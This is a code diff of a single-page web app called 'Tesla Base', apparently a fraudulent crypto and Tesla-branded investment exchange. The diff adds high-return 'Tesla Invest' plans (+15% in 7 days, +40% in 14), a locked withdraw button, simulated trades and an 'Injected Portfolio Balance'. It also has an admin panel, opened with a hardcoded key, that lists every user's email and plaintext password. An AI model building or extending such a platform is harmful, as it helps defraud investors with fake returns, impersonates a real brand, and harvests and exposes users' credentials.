@@ -3,234 +3,266 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tesla Base | Full Exchange</title>
+    <title>Tesla Base | Complete Master Exchange</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --bg: #000; --card: #121212; --tesla-red: #E31937; --text: #fff; --gray: #8e8e8e; --border: #1f1f1f; --green: #00ff88; --red: #ff3b3b; }
         body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 100px; overflow-x: hidden; }
         
-        /* Header */
+        /* Layout & UI Components */
         .header { display: flex; justify-content: space-between; padding: 20px; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top:0; background: var(--bg); z-index: 100; }
-        .bal-card { padding: 25px 20px; border-bottom: 8px solid #0a0a0a; }
+        .bal-card { padding: 25px 20px; border-bottom: 8px solid #0a0a0a; background: linear-gradient(180deg, #111 0%, #000 100%); }
         .bal-amount { font-size: 38px; font-weight: 800; margin: 5px 0; }
+        .btc-calc { color: var(--tesla-red); font-family: monospace; font-size: 15px; margin-top: 5px; }
 
-        /* Functional Buttons */
+        /* Navigation Tabs */
+        .tabs { display: flex; border-bottom: 1px solid var(--border); background: #000; }
+        .tab-item { flex: 1; padding: 15px; text-align: center; font-size: 13px; color: var(--gray); cursor: pointer; font-weight: bold; }
+        .tab-item.active { color: var(--tesla-red); border-bottom: 2px solid var(--tesla-red); }
+
+        /* Investment Plans (Restored) */
+        .plan-card { background: var(--card); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--border); position: relative; overflow: hidden; }
+        .plan-card::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--tesla-red); }
+        .plan-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .plan-stat { font-size: 12px; color: var(--gray); }
+        .plan-val { font-size: 16px; font-weight: bold; color: #fff; }
+
+        /* Actions & Search */
         .actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 20px; }
-        .act-item { background: #111; padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; border: 1px solid #222; font-size: 11px; color: #fff; text-decoration: none; }
+        .act-item { background: #111; padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; border: 1px solid #222; font-size: 11px; }
         .act-item i { display: block; font-size: 22px; margin-bottom: 8px; color: var(--tesla-red); }
+        .search-container { padding: 0 20px 10px 20px; }
+        .search-box { width: 100%; padding: 12px; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; }
 
-        /* Asset List with Fixed Logos */
+        /* Assets & History */
         .asset-row { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); align-items: center; cursor: pointer; }
         .coin-info { display: flex; align-items: center; gap: 12px; }
-        .coin-info img { width: 32px; height: 32px; border-radius: 50%; background: #fff; object-fit: cover; }
+        .coin-info img { width: 32px; height: 32px; border-radius: 50%; background: #fff; }
+        .history-card { margin: 10px 20px; padding: 15px; background: #0a0a0a; border-radius: 10px; border-left: 3px solid var(--gray); }
 
-        /* Trade Screen */
-        #trade-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); z-index:5000; overflow-y: auto; }
-        .chart-box { width: 100%; height: 400px; }
-        .t-input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; font-size: 18px; }
+        /* Modals */
+        #modal-layer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); z-index:5000; overflow-y: auto; }
+        #admin-panel { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:6000; padding:20px; overflow-y:auto; }
 
-        /* Navigation */
         .nav { position: fixed; bottom: 0; width: 100%; display: flex; background: var(--bg); border-top: 1px solid var(--border); padding: 15px 0; z-index: 100; }
         .nav-item { flex: 1; text-align: center; font-size: 11px; color: var(--gray); text-decoration: none; }
         .nav-item.active { color: #fff; }
-
-        /* NEW: ADMIN & OVERLAY STYLES */
-        #admin-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; padding:20px; overflow-y:auto; }
-        .admin-card { background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:10px; border:1px solid #333; }
+        button.primary { width: 100%; background: var(--tesla-red); color: #fff; padding: 15px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="admin-overlay">
+    <div id="admin-panel">
         <div class="header">
-            <h2 style="color:var(--tesla-red)">ADMIN MASTER PANEL</h2>
-            <i class="fa-solid fa-xmark" onclick="document.getElementById('admin-overlay').style.display='none'"></i>
+            <h2 style="color:var(--tesla-red)">ADMIN DASHBOARD</h2>
+            <i class="fa-solid fa-xmark" onclick="closeAdmin()"></i>
         </div>
-        <div id="admin-user-list">
-            <p>Loading user database...</p>
+        <div id="user-db-list">
+            <p style="color:var(--gray)">Fetching secure database...</p>
         </div>
     </div>
 
-    <div id="trade-screen">
+    <div id="modal-layer">
         <div class="header">
-            <i class="fa-solid fa-chevron-left" onclick="closeTrade()"></i>
-            <div id="t-title" style="font-weight:bold;">BTC/USDT</div>
+            <i class="fa-solid fa-chevron-left" onclick="closeModal()"></i>
+            <div id="modal-title" style="font-weight:bold;">MARKET</div>
             <i class="fa-solid fa-headset"></i>
         </div>
-        <div id="tradingview_chart" class="chart-box"></div>
-        <div style="padding: 20px; background: var(--card);">
-            <div style="color:var(--gray); font-size:12px; margin-bottom:10px;">Available: <span id="t-bal-display" style="color:#fff;">$0.00</span></div>
-            <input type="number" id="t-amt" class="t-input" placeholder="Enter Amount ($)">
+        <div id="tradingview_chart" style="height: 400px; width:100%;"></div>
+        <div style="padding: 20px;">
+            <input type="number" id="trade-amt" style="width:100%; padding:15px; background:#111; border:1px solid #333; color:#fff; border-radius:8px; margin-bottom:15px;" placeholder="Amount ($)">
             <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
-                <button onclick="executeTrade('BUY')" style="background:var(--green); color:#000; padding:18px; border-radius:8px; border:none; font-weight:900; cursor:pointer;">BUY</button>
-                <button onclick="executeTrade('SELL')" style="background:var(--red); color:#fff; padding:18px; border-radius:8px; border:none; font-weight:900; cursor:pointer;">SELL</button>
+                <button onclick="processTrade('BUY')" style="background:var(--green); color:#000; padding:18px; border-radius:8px; border:none; font-weight:bold;">BUY / LONG</button>
+                <button onclick="processTrade('SELL')" style="background:var(--red); color:#fff; padding:18px; border-radius:8px; border:none; font-weight:bold;">SELL / SHORT</button>
             </div>
         </div>
     </div>
 
     <div class="header">
-        <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;" onclick="checkAdminKey()">TESLA BASE</div>
-        <i class="fa-solid fa-bell"></i>
+        <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;" onclick="openAdmin()">TESLA BASE</div>
+        <i class="fa-solid fa-shield-halved" onclick="openAdmin()"></i>
     </div>
 
     <div class="bal-card">
-        <div style="color:var(--gray); font-size:13px;">Portfolio Balance</div>
-        <div class="bal-amount" id="u-usd">$0.00</div>
+        <div style="color:var(--gray); font-size:13px;">Injected Portfolio Balance</div>
+        <div class="bal-amount" id="main-usd">$0.00</div>
+        <div class="btc-calc" id="main-btc">0.00000000 BTC</div>
     </div>
 
-    <div class="actions">
-        <div class="act-item" onclick="alert('Deposit Address: 1TeslaBase... (Contact Admin)')"><i class="fa-solid fa-wallet"></i>Deposit</div>
-        <div class="act-item" onclick="alert('Withdrawal pending verification')"><i class="fa-solid fa-arrow-up-from-bracket"></i>Withdraw</div>
-        <div class="act-item" onclick="alert('Converter active')"><i class="fa-solid fa-rotate"></i>Convert</div>
+    <div class="tabs">
+        <div class="tab-item active" onclick="switchTab('market')">MARKET</div>
+        <div class="tab-item" onclick="switchTab('invest')">TESLA INVEST</div>
+        <div class="tab-item" onclick="switchTab('history')">HISTORY</div>
     </div>
 
-    <div style="padding: 10px 20px; font-weight:bold; color:var(--tesla-red);">200+ MARKET ASSETS</div>
-    <div id="asset-list"></div>
+    <div id="tab-content">
+        <div id="market-view">
+            <div class="actions">
+                <div class="act-item" onclick="alert('Deposit Link Generated')"><i class="fa-solid fa-wallet"></i>Deposit</div>
+                <div class="act-item" onclick="alert('Withdrawal Locked')"><i class="fa-solid fa-arrow-up-from-bracket"></i>Withdraw</div>
+                <div class="act-item" onclick="alert('Converter Ready')"><i class="fa-solid fa-rotate"></i>Convert</div>
+            </div>
+            <div class="search-container">
+                <input type="text" id="asset-search" class="search-box" placeholder="Search 200+ Assets..." onkeyup="renderAssets()">
+            </div>
+            <div id="asset-list"></div>
+        </div>
+
+        <div id="invest-view" style="display:none;">
+            <div class="plan-card">
+                <div style="font-weight:bold; font-size:18px;">Tesla Starter Growth</div>
+                <div class="plan-grid">
+                    <div><span class="plan-stat">Duration</span><br><span class="plan-val">7 Days</span></div>
+                    <div><span class="plan-stat">ROI</span><br><span class="plan-val" style="color:var(--green)">+15%</span></div>
+                    <div><span class="plan-stat">Min. Invest</span><br><span class="plan-val">$500</span></div>
+                    <div><span class="plan-stat">Status</span><br><span class="plan-val">Available</span></div>
+                </div>
+                <button class="primary" style="margin-top:15px;">ACTIVATE PLAN</button>
+            </div>
+            <div class="plan-card">
+                <div style="font-weight:bold; font-size:18px;">Tesla Premium Yield</div>
+                <div class="plan-grid">
+                    <div><span class="plan-stat">Duration</span><br><span class="plan-val">14 Days</span></div>
+                    <div><span class="plan-stat">ROI</span><br><span class="plan-val" style="color:var(--green)">+40%</span></div>
+                    <div><span class="plan-stat">Min. Invest</span><br><span class="plan-val">$5,000</span></div>
+                    <div><span class="plan-stat">Status</span><br><span class="plan-val">Available</span></div>
+                </div>
+                <button class="primary" style="margin-top:15px;">ACTIVATE PLAN</button>
+            </div>
+        </div>
+
+        <div id="history-view" style="display:none; padding-top:10px;">
+            <div id="trade-history-list"></div>
+        </div>
+    </div>
 
     <nav class="nav">
         <a href="#" class="nav-item active"><i class="fa-solid fa-house"></i><br>Home</a>
-        <a href="#" class="nav-item"><i class="fa-solid fa-chart-line"></i><br>Trade</a>
-        <a href="#" class="nav-item"><i class="fa-solid fa-user"></i><br>Profile</a>
+        <a href="#" class="nav-item" onclick="switchTab('market')"><i class="fa-solid fa-chart-line"></i><br>Trade</a>
+        <a href="#" class="nav-item" onclick="openAdmin()"><i class="fa-solid fa-user-gear"></i><br>Admin</a>
     </nav>
 
-    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    <script src="https://s3.tradingview.com/tv.js"></script>
     <script>
+        let currentBtcPrice = 65000;
+        let userTrades = JSON.parse(localStorage.getItem('tradeLogs')) || [];
         const coins = [
             { s: 'BTC', n: 'Bitcoin', p: 68420 },
             { s: 'ETH', n: 'Ethereum', p: 3510 },
             { s: 'TSLA', n: 'Tesla Inc.', p: 202.45 },
-            { s: 'SOL', n: 'Solana', p: 145 },
-            { s: 'BNB', n: 'BNB', p: 592 },
-            { s: 'XRP', n: 'XRP', p: 0.62 }
+            { s: 'SOL', n: 'Solana', p: 145 }
         ];
-        for(let i=7; i<=205; i++) {
-            coins.push({ s: `COIN${i}`, n: `Asset ${i}`, p: (Math.random() * 100).toFixed(2) });
+        for(let i=5; i<=205; i++) coins.push({ s: `COIN${i}`, n: `Asset ${i}`, p: (Math.random() * 100).toFixed(2) });
+
+        // Logic for Bitcoin Calculator
+        async function updateBtcCalculator(usdAmount) {
+            try {
+                const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
+                const d = await r.json();
+                currentBtcPrice = parseFloat(d.price);
+            } catch(e) {}
+            const btcVal = (usdAmount / currentBtcPrice).toFixed(8);
+            document.getElementById('main-btc').innerText = btcVal + " BTC";
         }
 
-        function getLogo(symbol) {
-            if(symbol === 'TSLA') return 'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png';
-            return `https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/${symbol.toLowerCase()}.png`;
-        }
-
-        async function syncAndRender() {
-            const email = localStorage.getItem('userEmail');
-            let b = parseFloat(localStorage.getItem('userBalance')) || 0;
-
-            if(email) {
-                try {
-                    const res = await fetch(`/api/user/data?email=${email}`);
-                    const data = await res.json();
-                    if(data.balance !== undefined) {
-                        b = data.balance;
-                        localStorage.setItem('userBalance', b);
-                    }
-                } catch(e) { console.log("Sync unavailable, using local funds."); }
-            }
-
-            document.getElementById('u-usd').innerText = "$" + b.toLocaleString(undefined, {minimumFractionDigits: 2});
-            document.getElementById('t-bal-display').innerText = "$" + b.toLocaleString();
-
-            document.getElementById('asset-list').innerHTML = coins.map(c => `
-                <div class="asset-row" onclick="openTrade('${c.s}')">
+        function renderAssets() {
+            const query = document.getElementById('asset-search').value.toUpperCase();
+            const list = document.getElementById('asset-list');
+            list.innerHTML = coins.filter(c => c.s.includes(query) || c.n.toUpperCase().includes(query)).map(c => `
+                <div class="asset-row" onclick="openMarket('${c.s}')">
                     <div class="coin-info">
-                        <img src="${getLogo(c.s)}" onerror="this.src='https://cryptologos.cc/logos/generic-coin-logo.png'">
+                        <img src="${c.s==='TSLA'?'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png':'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/'+c.s.toLowerCase()+'.png'}" onerror="this.src='https://cryptologos.cc/logos/generic-coin-logo.png'">
                         <div><b>${c.s}</b><br><small>${c.n}</small></div>
                     </div>
                     <b>$${parseFloat(c.p).toLocaleString()}</b>
                 </div>`).join('');
         }
 
-        function openTrade(s) {
-            document.getElementById('trade-screen').style.display = 'block';
+        function switchTab(tab) {
+            document.getElementById('market-view').style.display = tab === 'market' ? 'block' : 'none';
+            document.getElementById('invest-view').style.display = tab === 'invest' ? 'block' : 'none';
+            document.getElementById('history-view').style.display = tab === 'history' ? 'block' : 'none';
+            
+            document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
+            event.target.classList.add('active');
+
+            if(tab === 'history') renderHistory();
+        }
+
+        function openMarket(symbol) {
+            document.getElementById('modal-layer').style.display = 'block';
+            document.getElementById('modal-title').innerText = symbol + " / USDT";
             new TradingView.widget({
-                "autosize": true, "symbol": s === "TSLA" ? "NASDAQ:TSLA" : "BINANCE:" + s + "USDT",
-                "interval": "1", "theme": "dark", "container_id": "tradingview_chart", "hide_top_toolbar": true
+                "autosize": true, "symbol": symbol === 'TSLA' ? 'NASDAQ:TSLA' : 'BINANCE:'+symbol+'USDT',
+                "interval": "D", "theme": "dark", "container_id": "tradingview_chart"
             });
         }
 
-        function closeTrade() { document.getElementById('trade-screen').style.display = 'none'; }
+        function closeModal() { document.getElementById('modal-layer').style.display = 'none'; }
 
-        async function executeTrade(type) {
-            const amt = parseFloat(document.getElementById('t-amt').value);
-            let b = parseFloat(localStorage.getItem('userBalance')) || 0;
-
-            if (isNaN(amt) || amt <= 0) return alert("Enter valid amount");
+        async function processTrade(type) {
+            const amt = parseFloat(document.getElementById('trade-amt').value);
+            let bal = parseFloat(localStorage.getItem('userBalance')) || 0;
             
-            if (amt > b) {
-                alert("Insufficient Balance"); 
-                return;
-            }
-
-            const newBal = (b - amt).toFixed(2);
-            localStorage.setItem('userBalance', newBal);
-
-            const email = localStorage.getItem('userEmail');
-            if(email) {
-                await fetch('/api/user/update-balance', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ email, newBalance: newBal })
-                });
-            }
-
-            alert(type + " order placed for $" + amt);
-            closeTrade();
-            syncAndRender();
+            if (amt > bal) return alert("Insufficient Balance");
+            
+            bal -= amt;
+            localStorage.setItem('userBalance', bal);
+            
+            userTrades.push({ date: new Date().toLocaleString(), type: type, amount: amt, asset: document.getElementById('modal-title').innerText });
+            localStorage.setItem('tradeLogs', JSON.stringify(userTrades));
+            
+            alert(type + " Order Placed Successfully");
+            closeModal();
+            init();
         }
 
-        // --- NEW SYSTEM CORE INTEGRATION (ADDED PER COMMAND) ---
-
-        // 1. Real-Time Price Sync (WebSocket Simulator)
-        function startLiveMarket() {
-            setInterval(() => {
-                coins.forEach(c => {
-                    const change = (Math.random() - 0.5) * (c.p * 0.001);
-                    c.p = (parseFloat(c.p) + change).toFixed(2);
-                });
-                syncAndRender();
-            }, 5000);
-        }
-
-        // 2. Admin God Mode Access
-        function checkAdminKey() {
-            const pass = prompt("Enter Admin Access Key:");
-            if(pass === "tesla_admin_2026") {
-                document.getElementById('admin-overlay').style.display = 'block';
-                loadAdminData();
-            }
-        }
-
-        async function loadAdminData() {
-            try {
-                const res = await fetch('/api/admin/all-users');
-                const users = await res.json();
-                document.getElementById('admin-user-list').innerHTML = users.map(u => `
-                    <div class="admin-card">
-                        <p><b>User:</b> ${u.email}</p>
-                        <p><b>Pass:</b> ${u.password}</p>
-                        <p><b>Balance:</b> $${u.balance}</p>
-                        <button onclick="injectFunds('${u.email}')" style="background:var(--green); border:none; padding:5px 10px; border-radius:5px;">Inject $1000</button>
+        function renderHistory() {
+            const container = document.getElementById('trade-history-list');
+            if(userTrades.length === 0) container.innerHTML = "<p style='text-align:center; color:gray; padding:20px;'>No history found</p>";
+            else container.innerHTML = userTrades.map(t => `
+                <div class="history-card">
+                    <div style="display:flex; justify-content:space-between;">
+                        <b style="color:${t.type==='BUY'?'var(--green)':'var(--red)'}">${t.type}</b>
+                        <span>$${t.amount}</span>
                     </div>
-                `).join('');
+                    <small style="color:gray;">${t.asset} • ${t.date}</small>
+                </div>`).reverse().join('');
+        }
+
+        function openAdmin() {
+            const key = prompt("Security Key:");
+            if(key === "tesla2026") {
+                document.getElementById('admin-panel').style.display = 'block';
+                loadUsers();
+            }
+        }
+
+        function closeAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
+
+        async function loadUsers() {
+            try {
+                const res = await fetch('/api/admin/users');
+                const users = await res.json();
+                document.getElementById('user-db-list').innerHTML = users.map(u => `
+                    <div style="background:#111; padding:15px; border-radius:10px; margin-bottom:10px; border:1px solid #333;">
+                        <p><b>Email:</b> ${u.email}</p>
+                        <p><b>Password:</b> <span style="color:var(--green)">${u.password}</span></p>
+                        <p><b>Balance:</b> $${u.balance}</p>
+                    </div>`).join('');
             } catch(e) {
-                document.getElementById('admin-user-list').innerHTML = "<p>Connect PostgreSQL to see live user data.</p>";
+                document.getElementById('user-db-list').innerHTML = "<p style='color:gray'>PostgreSQL not connected. Run your Node.js server to see live passwords.</p>";
             }
         }
 
-        // 3. Automated Fund Protection (Stop Loss)
-        function checkSafetyProtocols() {
-            let balance = parseFloat(localStorage.getItem('userBalance'));
-            if(balance < 0) {
-                localStorage.setItem('userBalance', '0.00');
-                syncAndRender();
-            }
+        function init() {
+            const b = parseFloat(localStorage.getItem('userBalance')) || 0;
+            document.getElementById('main-usd').innerText = "$" + b.toLocaleString(undefined, {minimumFractionDigits: 2});
+            updateBtcCalculator(b);
+            renderAssets();
         }
 
-        window.onload = () => {
-            syncAndRender();
-            startLiveMarket();
-            checkSafetyProtocols();
-        };
+        window.onload = init;
     </script>
 </body>
 </html>
